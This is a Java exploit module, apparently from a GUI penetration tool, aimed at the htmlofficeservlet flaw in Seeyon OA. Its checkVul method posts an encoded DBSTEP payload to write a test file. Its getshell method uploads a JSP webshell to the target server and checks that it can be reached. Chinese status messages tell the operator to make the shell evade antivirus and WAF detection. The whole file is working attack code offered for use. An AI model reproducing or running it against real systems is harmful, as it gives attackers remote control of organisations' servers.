package exp.oa.seeyonoa;

import core.Exploitlnterface;

import java.util.HashMap;

import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

public class seeyonoa_htmlofficeservlet implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return shell(url, textArea);
    }

    private Boolean att(String url, TextArea textArea) {
        String payload = "DBSTEP V3.0     370             0               300             DBSTEP=OKMLlKlV\n" +
                "OPTION=S3WYOSWLBSGr\r\n" +
                "currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n" +
                "CREATEDATE=wUghPB3szB3Xwg66\r\n" +
                "RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n" +
                "originalFileId=wV66\r\n" +
                "originalCreateDate=wUghPB3szB3Xwg66\r\n" +
                "FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdcRQin1Q/nrS5NrJ3\r\n" +
                "needReadFile=yRWZdAS6\r\n" +
                "originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n" +
                "111111111111111111111111111111111111111\r\n" +
                shell.readFile(shell.Testpath);

        Response post = HttpTools.post(url + "/seeyon/htmlofficeservlet", payload, new HashMap<String, String>(), "utf-8");
        if (post.getCode() == 200 && post.getText().contains(shell.test_payload)) {
            Response response = HttpTools.get(url + "/seeyon/nishizhu.txt", new HashMap<String, String>(), "utf-8");
            if (response.getCode() == 200 && response.getText().contains(shell.test_payload)) {
                Platform.runLater(() -> {
                    textArea.appendText("\n 漏洞存在 测试文件写入成功\n " + url + "/seeyon/nishizhu.txt");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n seeyonoa_htmlofficeservlet-RCE-漏洞不存在 (出现误报请联系作者)");
                });
                return false;
            }
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n seeyonoa_htmlofficeservlet-RCE-漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }
    }

    private Boolean shell(String url, TextArea textArea) {
        String payload = "DBSTEP V3.0     370             0               4000             DBSTEP=OKMLlKlV\n" +
                "OPTION=S3WYOSWLBSGr\r\n" +
                "currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n" +
                "CREATEDATE=wUghPB3szB3Xwg66\r\n" +
                "RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n" +
                "originalFileId=wV66\r\n" +
                "originalCreateDate=wUghPB3szB3Xwg66\r\n" +
                "FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdcRQin1Q/nrS5nHzs\r\n" +
                "needReadFile=yRWZdAS6\r\n" +
                "originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n" +
                "111111111111111111111111111111111111111\r\n" +
                shell.readFile(shell.Jsppath);

        Response post = HttpTools.post(url + "/seeyon/htmlofficeservlet", payload, new HashMap<String, String>(), "utf-8");
        if (post.getCode() == 200 && post.getText().contains(shell.test_payload)) {
            Response response = HttpTools.get(url + "/seeyon/nishizhu.jsp", new HashMap<String, String>(), "utf-8");
            if (response.getCode() == 200 && response.getText().contains(shell.test_payload)) {
                Platform.runLater(() -> {
                    textArea.appendText("\n 漏洞存在 webshell文件写入成功\n " + url + "/seeyon/nishizhu.jsp");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell被查杀！！请进行免杀！！！");
                });
                return false;
            }
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n waf拦截！！请进行免杀！！！");
            });
            return false;
        }
    }
}
